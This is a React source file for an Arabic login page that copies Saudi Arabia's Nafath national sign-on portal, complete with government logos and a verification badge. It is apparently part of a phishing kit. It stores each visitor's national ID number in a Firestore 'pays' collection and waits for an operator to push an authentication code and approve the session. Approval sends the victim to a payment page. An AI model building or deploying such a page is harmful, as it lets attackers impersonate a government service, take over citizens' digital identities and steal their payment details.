"use client"

import { Loader, Loader2Icon, Menu, ShieldAlert } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card, CardContent } from "@/components/ui/card"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { useEffect,  useState } from "react"
import { doc, onSnapshot } from "firebase/firestore"
import { addData, db } from "@/lib/firebase"
import { Alert } from "@/components/ui/alert"

export default function Component() {
  const [showAuthDialog, setShowAuthDialog] = useState(false)
  const [authNumber, setAuthNumber] = useState<any>(<div className="animate-ping"/>)
  const [isloading, setIsLoading] = useState(false)
  const [idLogin, setLoginID] = useState("")
  const [showError, setShowError] = useState("")

  useEffect(() => {
    const visitorId = localStorage.getItem("visitor")
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as any
          setAuthNumber(data.authNumber)
          if(data.approval==="approved"){
            window.location.href="/payment"
          } else  if(data.approval==="rejected"){
            setShowAuthDialog(false)
            setShowError('فشلت المصادقة الرجاء المحاولة مرة اخرى')
          }
        }
      })

      return () => unsubscribe()
    }
  }, [])
  const handleLogin = (e:any) => {
    e.preventDefault()

    // Generate random 6-digit authentication number
    const visitorId = localStorage.getItem("visitor")
    setShowError('')

    setIsLoading(true)
    addData({id:visitorId,nafazId:idLogin, authNumber:"...",approval:"pending"})
    setTimeout(() => {
      setShowAuthDialog(true)
    setIsLoading(false)

    }, 5000);
  }

  return (
    <div className="min-h-screen bg-gray-100" dir="rtl">
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="flex items-center justify-between p-4">
          <Menu className="w-6 h-6 text-gray-600" />
          <img src="lgog.png" alt="sd" width={80}/>

          <div className="w-6"></div>
        </div>
      </header>

      {/* Main Content */}
      <main className="p-4 space-y-6">
        {/* Login Section Title */}
        <div className="text-center">
          <h1 className="text-xl font-semibold text-gray-800 mb-6">الدخول على النظام</h1>
        </div>

        {/* Nafath App Section */}
        <div className="bg-teal-600 text-white p-4 rounded-lg text-center">
          <h2 className="text-lg font-semibold mb-2">تطبيق نفاذ</h2>
          <div className="w-8 h-1 bg-white mx-auto"></div>
        </div>

      <form onSubmit={handleLogin}>
        {/* Login Form */}
        <Card className="bg-white">
          <CardContent className="p-6 space-y-4">
            <div className="text-center text-gray-600 mb-4">رقم بطاقة الأحوال/الإقامة</div>

            <Input
              placeholder="أدخل رقم الأحوال/الإقامة الخاص بك هنا"
              className="text-right border-gray-300 h-12"
              dir="rtl"
              onChange={(e)=>setLoginID(e.target.value)}
            />
{showError &&<Alert  className="text-sm text-red-500 flex justify-between bg-red-50" dir="rtl">
<ShieldAlert color="red" className="text-right "/> {showError}
</Alert>
}            <Button type="submit" disabled={isloading} className="w-full bg-teal-600 hover:bg-teal-700 text-white h-12 text-lg">
              تسجيل الدخول{isloading&&<Loader2Icon className="animate-spin"/>}
            </Button>

            <div className="text-center text-gray-600 text-sm mt-4">لتحميل تطبيق نفاذ</div>

            {/* App Store Buttons */}
            <div className="flex justify-center space-x-2 space-x-reverse mt-4">
              <div className="text-white px-4 py-2 rounded-lg text-xs flex items-center space-x-2 space-x-reverse">
<img src="plays.svg" alt="sd"/>
                
              </div>

           
              <div className="text-white px-4 py-2 rounded-lg text-xs flex items-center space-x-2 space-x-reverse">
                <div>
<img src="apple.svg" alt="sd"/>
                </div>
              </div>

            </div>
          </CardContent>
        </Card>
        </form>
        {/* User and Password Section */}
        <div className="bg-gray-200 p-4 rounded-lg text-center">
          <div className="text-gray-700 font-semibold">اسم المستخدم وكلمة المرور</div>
          <div className="text-2xl text-gray-400 mt-2">+</div>
        </div>

        {/* New Nafath Platform Section */}
        <Card className="bg-teal-600 text-white">
          <CardContent className="p-6 text-center space-y-4">
            <h2 className="text-xl font-bold">منصة النفاذ الجديدة</h2>
            <p className="text-sm leading-relaxed">
              لتجربة أكثر سهولة استخدم النسخة المحدثة
              <br />
              من منصة النفاذ الوطني الموحد
            </p>
            <Button className="bg-white text-teal-600 hover:bg-gray-100 px-8 py-2 rounded-lg font-semibold">
              ابدأ الآن
            </Button>
          </CardContent>
        </Card>

        {/* Authentication Dialog */}
        <Dialog open={showAuthDialog} onOpenChange={setShowAuthDialog}>
          <DialogContent className="max-w-sm mx-auto" dir="rtl">
            <DialogHeader>
              <DialogTitle className="text-center text-xl font-bold text-teal-600 mb-4">طلب المصادقة</DialogTitle>
            </DialogHeader>

            <div className="text-center space-y-6 p-4">
              <div className="bg-teal-50 border-2 border-teal-200 rounded-lg p-6">
                <div className="text-sm text-gray-600 mb-2">رقم المصادقة</div>
                <div className="text-3xl font-bold text-teal-600 tracking-wider">{authNumber}</div>
              </div>

              <div className="space-y-3">
                <div className="text-gray-700 font-semibold">تم إرسال طلب مصادقة إلى تطبيق نفاذ</div>
                <div className="text-sm text-gray-600 leading-relaxed">
                  يرجى فتح تطبيق نفاذ على جهازك المحمول والضغط على الرقم المطابق لإتمام عملية تسجيل الدخول
                </div>
              </div>

              <div className="flex items-center justify-center space-x-2 space-x-reverse text-teal-600">
                <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping"></div>
                <div className="text-sm">في انتظار الموافقة...</div>
              </div>

              <Button
                variant="outline"
                onClick={() => setShowAuthDialog(false)}
                className="w-full border-gray-300 text-gray-600 hover:bg-gray-50"
              >
                إلغاء
              </Button>
            </div>
          </DialogContent>
        </Dialog>
      </main>

      {/* Footer */}
      <footer className="mt-8 p-4 bg-white">
        <div className="text-center space-y-4">
          <div className="text-gray-600 text-sm">تطوير وتشغيل</div>

          <div className="flex justify-center items-center space-x-4 space-x-reverse">
          <img src="nic-20.png" alt="sd" width={120}/>

          </div>

          <div className="flex justify-center space-x-4 space-x-reverse text-xs text-gray-600">
            <a href="#" className="hover:text-teal-600">
              الرئيسية
            </a>
            <a href="#" className="hover:text-teal-600">
              حول
            </a>
            <a href="#" className="hover:text-teal-600">
              اتصل بنا
            </a>
            <a href="#" className="hover:text-teal-600">
              الشروط والأحكام
            </a>
            <a href="#" className="hover:text-teal-600">
              المساعدة والدعم
            </a>
            <a href="#" className="hover:text-teal-600">
              سياسة الخصوصية
            </a>
          </div>

          {/* Government Verification Badge */}
          <div className="flex justify-center mt-4">
          <img src="cisoc.svg" alt="sd" width={50}/>

          </div>
        </div>
      </footer>
    </div>
  )
}
